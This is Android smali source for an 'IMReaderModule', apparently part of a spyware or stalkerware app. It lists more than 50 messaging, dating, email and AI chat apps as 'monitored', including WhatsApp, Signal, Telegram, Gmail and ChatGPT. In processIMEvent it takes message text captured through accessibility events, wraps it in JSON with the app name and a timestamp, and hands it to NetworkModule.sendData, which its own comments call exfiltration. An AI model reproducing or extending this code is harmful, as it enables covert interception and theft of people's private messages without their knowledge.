.class public Lcom/smilex/enhanced/modules/IMReaderModule;
.super Ljava/lang/Object;
.source "IMReaderModule.java"

# ─────────────────────────────────────────────────────────────
# Per-app IM / Social / AI / Email message extraction
# Ported from hwapp391 hw/imreader/ + hw/utils/o.java
# Covers 50+ apps across all categories
# ─────────────────────────────────────────────────────────────

# ===== Field declarations =====
.field private static final WHATSAPP:Ljava/lang/String; = "com.whatsapp"
.field private static final TELEGRAM:Ljava/lang/String; = "org.telegram.messenger"
.field private static final TELEGRAM_PLUS:Ljava/lang/String; = "org.telegram.plus"
.field private static final VIDGRAM:Ljava/lang/String; = "org.vidogram.messenger"
.field private static final INSTAGRAM:Ljava/lang/String; = "com.instagram.android"
.field private static final FB_MESSENGER:Ljava/lang/String; = "com.facebook.orca"
.field private static final FACEBOOK:Ljava/lang/String; = "com.facebook.katana"
.field private static final VIBER:Ljava/lang/String; = "com.viber.voip"
.field private static final SKYPE:Ljava/lang/String; = "com.skype.raider"
.field private static final VK_IM:Ljava/lang/String; = "com.vk.im"
.field private static final VK_ANDROID:Ljava/lang/String; = "com.vkontakte.android"
.field private static final DISCORD:Ljava/lang/String; = "com.discord"
.field private static final LINE:Ljava/lang/String; = "jp.naver.line.android"
.field private static final LINE_LITE:Ljava/lang/String; = "com.linecorp.linelite"
.field private static final KAKAOTALK:Ljava/lang/String; = "com.kakao.talk"
.field private static final BBM:Ljava/lang/String; = "com.bbm.enterprise"
.field private static final WECHAT:Ljava/lang/String; = "com.tencent.mm"
.field private static final WEIBO:Ljava/lang/String; = "com.weico.international"
.field private static final SNAPCHAT:Ljava/lang/String; = "com.snapchat.android"
.field private static final TINDER:Ljava/lang/String; = "com.tinder"
.field private static final TUMBLR:Ljava/lang/String; = "com.tumblr"
.field private static final TWITTER:Ljava/lang/String; = "com.twitter.android"
.field private static final TIKTOK:Ljava/lang/String; = "com.zhiliaoapp.musically"
.field private static final TIKTOK_LITE:Ljava/lang/String; = "com.zhiliaoapp.musically.go"
.field private static final REDDIT:Ljava/lang/String; = "com.reddit.frontpage"
.field private static final TEXTME:Ljava/lang/String; = "com.textmeinc.textme"
.field private static final KIK:Ljava/lang/String; = "kik.android"
.field private static final THREEMA:Ljava/lang/String; = "ch.threema.app.onprem"
.field private static final THREEMA_WORK:Ljava/lang/String; = "ch.threema.app.work"
.field private static final ZALO:Ljava/lang/String; = "com.zing.zalo"
.field private static final MUZMATCH:Ljava/lang/String; = "com.muzmatch.muzmatchapp"
.field private static final IMO:Ljava/lang/String; = "com.imo.android.imoim"
.field private static final WAMBA:Ljava/lang/String; = "com.wamba.bbs"
.field private static final WAPLOG:Ljava/lang/String; = "com.waplog.social"
.field private static final BOO:Ljava/lang/String; = "enterprises.dating.boo"
.field private static final MAMBA:Ljava/lang/String; = "ru.mamba.client"
.field private static final GOSTINDER:Ljava/lang/String; = "ru.gostinder"
.field private static final OK_RU:Ljava/lang/String; = "ru.ok.android"
.field private static final ONEME:Ljava/lang/String; = "ru.oneme.app"
.field private static final SKYLOVE:Ljava/lang/String; = "su.xdesign.skylove"
.field private static final SIGNAL:Ljava/lang/String; = "org.thoughtcrime.securesms"
.field private static final HANGOUTS:Ljava/lang/String; = "com.google.android.talk"
.field private static final GMAIL:Ljava/lang/String; = "com.google.android.gm"
.field private static final OUTLOOK:Ljava/lang/String; = "com.microsoft.office.outlook"
.field private static final OUTLOOK_LITE:Ljava/lang/String; = "com.microsoft.outlooklite"
.field private static final BLUEMAIL:Ljava/lang/String; = "me.bluemail.mail"
.field private static final YANDEX_MAIL:Ljava/lang/String; = "ru.yandex.mail"
.field private static final DEEPSEEK:Ljava/lang/String; = "com.deepseek.chat"
.field private static final CHATGPT:Ljava/lang/String; = "com.openai.chatgpt"
.field private static final GROK:Ljava/lang/String; = "com.x.ai.grok"
.field private static final GROK_ALT:Ljava/lang/String; = "ai.x.grok"
.field private static final PERPLEXITY:Ljava/lang/String; = "ai.perplexity.app.android"
.field private static final SCALEUP:Ljava/lang/String; = "com.scaleup.chatai"
.field private static final ALICE:Ljava/lang/String; = "com.yandex.aliceapp"
.field private static final OPENAI_BOT:Ljava/lang/String; = "open.chat.gpt.aichat.bot.free.app"
.field private static final TEAMS:Ljava/lang/String; = "com.microsoft.teams"
.field private static final GOOGLE_MEET:Ljava/lang/String; = "com.google.android.apps.meetings"
.field private static final GOOGLE_CHAT:Ljava/lang/String; = "com.google.android.apps.dynamite"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

# ─────────────────────────────────────────────────────────────
# Check if a package is a monitored app (IM / Social / AI / Email)
# Returns true if the package is in our monitoring list
# ─────────────────────────────────────────────────────────────
.method public static isIMApp(Ljava/lang/String;)Z
    .registers 3
    if-eqz p0, :return_false

    const-string v0, "com.whatsapp"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "org.telegram.messenger"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "org.telegram.plus"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "org.vidogram.messenger"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "org.thoughtcrime.securesms"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.instagram.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.facebook.orca"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.facebook.katana"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.viber.voip"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.skype.raider"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.vk.im"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.vkontakte.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.discord"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "jp.naver.line.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.linecorp.linelite"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.kakao.talk"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.bbm.enterprise"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.tencent.mm"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.weico.international"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.snapchat.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.tinder"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.tumblr"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.twitter.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.zhiliaoapp.musically"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.zhiliaoapp.musically.go"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.reddit.frontpage"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.textmeinc.textme"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "kik.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "ch.threema.app.onprem"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "ch.threema.app.work"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.zing.zalo"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.muzmatch.muzmatchapp"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.imo.android.imoim"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.wamba.bbs"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.waplog.social"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "enterprises.dating.boo"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "ru.mamba.client"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "ru.gostinder"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "ru.ok.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "ru.oneme.app"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "su.xdesign.skylove"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.google.android.talk"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.google.android.gm"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.microsoft.office.outlook"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.microsoft.outlooklite"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "me.bluemail.mail"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "ru.yandex.mail"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.deepseek.chat"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.openai.chatgpt"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.x.ai.grok"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "ai.x.grok"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "ai.perplexity.app.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.scaleup.chatai"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.yandex.aliceapp"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "open.chat.gpt.aichat.bot.free.app"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.microsoft.teams"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.google.android.apps.meetings"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.google.android.apps.dynamite"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    :return_false
    const/4 v0, 0x0
    return v0

    :return_true
    const/4 v0, 0x1
    return v0
.end method

# ─────────────────────────────────────────────────────────────
# Get the data-type label for a monitored app package
# Used by processIMEvent to route to the correct exfil type
# ─────────────────────────────────────────────────────────────
.method public static getAppTypeLabel(Ljava/lang/String;)Ljava/lang/String;
    .registers 3

    const-string v0, "com.whatsapp"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l1
    const-string v0, "im_whatsapp"
    return-object v0

    :l1
    const-string v0, "org.telegram.messenger"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l2
    const-string v0, "im_telegram"
    return-object v0

    :l2
    const-string v0, "org.telegram.plus"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l2b
    const-string v0, "im_telegram"
    return-object v0

    :l2b
    const-string v0, "org.vidogram.messenger"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l2c
    const-string v0, "im_telegram"
    return-object v0

    :l2c
    const-string v0, "org.thoughtcrime.securesms"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l3
    const-string v0, "im_signal"
    return-object v0

    :l3
    const-string v0, "com.instagram.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l4
    const-string v0, "im_instagram"
    return-object v0

    :l4
    const-string v0, "com.facebook.orca"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l5
    const-string v0, "im_facebook"
    return-object v0

    :l5
    const-string v0, "com.facebook.katana"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l6
    const-string v0, "im_facebook"
    return-object v0

    :l6
    const-string v0, "com.viber.voip"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l7
    const-string v0, "im_viber"
    return-object v0

    :l7
    const-string v0, "com.skype.raider"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l8
    const-string v0, "im_skype"
    return-object v0

    :l8
    const-string v0, "com.vk.im"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l9
    const-string v0, "im_vk"
    return-object v0

    :l9
    const-string v0, "com.vkontakte.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l10
    const-string v0, "im_vk"
    return-object v0

    :l10
    const-string v0, "com.discord"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l11
    const-string v0, "im_discord"
    return-object v0

    :l11
    const-string v0, "jp.naver.line.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l12
    const-string v0, "im_line"
    return-object v0

    :l12
    const-string v0, "com.linecorp.linelite"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l13
    const-string v0, "im_line"
    return-object v0

    :l13
    const-string v0, "com.kakao.talk"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l14
    const-string v0, "im_kakaotalk"
    return-object v0

    :l14
    const-string v0, "com.bbm.enterprise"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l15
    const-string v0, "im_bbm"
    return-object v0

    :l15
    const-string v0, "com.tencent.mm"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l16
    const-string v0, "im_wechat"
    return-object v0

    :l16
    const-string v0, "com.weico.international"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l17
    const-string v0, "im_weibo"
    return-object v0

    :l17
    const-string v0, "com.snapchat.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l18
    const-string v0, "im_snapchat"
    return-object v0

    :l18
    const-string v0, "com.tinder"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l19
    const-string v0, "im_tinder"
    return-object v0

    :l19
    const-string v0, "com.tumblr"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l20
    const-string v0, "im_tumblr"
    return-object v0

    :l20
    const-string v0, "com.twitter.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l21
    const-string v0, "im_twitter"
    return-object v0

    :l21
    const-string v0, "com.zhiliaoapp.musically"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l22
    const-string v0, "im_tiktok"
    return-object v0

    :l22
    const-string v0, "com.zhiliaoapp.musically.go"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l23
    const-string v0, "im_tiktok"
    return-object v0

    :l23
    const-string v0, "com.reddit.frontpage"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l24
    const-string v0, "im_reddit"
    return-object v0

    :l24
    const-string v0, "com.textmeinc.textme"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l25
    const-string v0, "im_textme"
    return-object v0

    :l25
    const-string v0, "kik.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l26
    const-string v0, "im_kik"
    return-object v0

    :l26
    const-string v0, "ch.threema.app.onprem"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l27
    const-string v0, "im_threema"
    return-object v0

    :l27
    const-string v0, "ch.threema.app.work"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l28
    const-string v0, "im_threema"
    return-object v0

    :l28
    const-string v0, "com.zing.zalo"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l29
    const-string v0, "im_zalo"
    return-object v0

    :l29
    const-string v0, "com.muzmatch.muzmatchapp"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l30
    const-string v0, "im_muzmatch"
    return-object v0

    :l30
    const-string v0, "com.imo.android.imoim"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l31
    const-string v0, "im_imo"
    return-object v0

    :l31
    const-string v0, "com.wamba.bbs"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l32
    const-string v0, "im_wamba"
    return-object v0

    :l32
    const-string v0, "com.waplog.social"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l33
    const-string v0, "im_waplog"
    return-object v0

    :l33
    const-string v0, "enterprises.dating.boo"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l34
    const-string v0, "im_boo"
    return-object v0

    :l34
    const-string v0, "ru.mamba.client"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l35
    const-string v0, "im_mamba"
    return-object v0

    :l35
    const-string v0, "ru.gostinder"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l36
    const-string v0, "im_gostinder"
    return-object v0

    :l36
    const-string v0, "ru.ok.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l37
    const-string v0, "im_okru"
    return-object v0

    :l37
    const-string v0, "ru.oneme.app"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l38
    const-string v0, "im_oneme"
    return-object v0

    :l38
    const-string v0, "su.xdesign.skylove"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l39
    const-string v0, "im_skylove"
    return-object v0

    :l39
    const-string v0, "com.google.android.talk"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l40
    const-string v0, "im_hangouts"
    return-object v0

    :l40
    const-string v0, "com.google.android.gm"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l41
    const-string v0, "im_gmail"
    return-object v0

    :l41
    const-string v0, "com.microsoft.office.outlook"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l42
    const-string v0, "im_outlook"
    return-object v0

    :l42
    const-string v0, "com.microsoft.outlooklite"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l43
    const-string v0, "im_outlook"
    return-object v0

    :l43
    const-string v0, "me.bluemail.mail"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l44
    const-string v0, "im_bluemail"
    return-object v0

    :l44
    const-string v0, "ru.yandex.mail"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l45
    const-string v0, "im_yandexmail"
    return-object v0

    :l45
    const-string v0, "com.deepseek.chat"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l46
    const-string v0, "im_deepseek"
    return-object v0

    :l46
    const-string v0, "com.openai.chatgpt"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l47
    const-string v0, "im_chatgpt"
    return-object v0

    :l47
    const-string v0, "com.x.ai.grok"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l48
    const-string v0, "im_grok"
    return-object v0

    :l48
    const-string v0, "ai.x.grok"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l49
    const-string v0, "im_grok"
    return-object v0

    :l49
    const-string v0, "ai.perplexity.app.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l50
    const-string v0, "im_perplexity"
    return-object v0

    :l50
    const-string v0, "com.scaleup.chatai"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l51
    const-string v0, "im_scaleup"
    return-object v0

    :l51
    const-string v0, "com.yandex.aliceapp"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l52
    const-string v0, "im_alice"
    return-object v0

    :l52
    const-string v0, "open.chat.gpt.aichat.bot.free.app"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l53
    const-string v0, "im_chatgpt"
    return-object v0

    :l53
    const-string v0, "com.microsoft.teams"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l54
    const-string v0, "im_teams"
    return-object v0

    :l54
    const-string v0, "com.google.android.apps.meetings"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l55
    const-string v0, "im_meet"
    return-object v0

    :l55
    const-string v0, "com.google.android.apps.dynamite"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :l56
    const-string v0, "im_googlechat"
    return-object v0

    :l56
    # Fallback: generic "im" type
    const-string v0, "im"
    return-object v0
.end method

# ─────────────────────────────────────────────────────────────
# Process an accessibility event for IM apps
# Builds JSON {"app": pkg, "text": text, "ts": epoch_ms}
# and exfils via NetworkModule.sendData(type, json)
# ─────────────────────────────────────────────────────────────
.method public static processIMEvent(Ljava/lang/String;Ljava/lang/String;I)V
    .registers 10
    if-eqz p0, :return_void
    if-eqz p1, :return_void

    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;
    move-result-object p1
    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z
    move-result v0
    if-nez v0, :return_void

    :try_start
    # Build JSON payload
    new-instance v0, Lorg/json/JSONObject;
    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "app"
    invoke-virtual {v0, v1, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "text"
    invoke-virtual {v0, v1, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v2
    const-string v4, "ts"
    invoke-virtual {v0, v4, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    # Determine data_type label via getAppTypeLabel
    invoke-static {p0}, Lcom/smilex/enhanced/modules/IMReaderModule;->getAppTypeLabel(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v1

    :send
    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;
    move-result-object v2
    invoke-static {v1, v2}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V

    :return_void
    return-void
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :error
    :error
    return-void
.end method
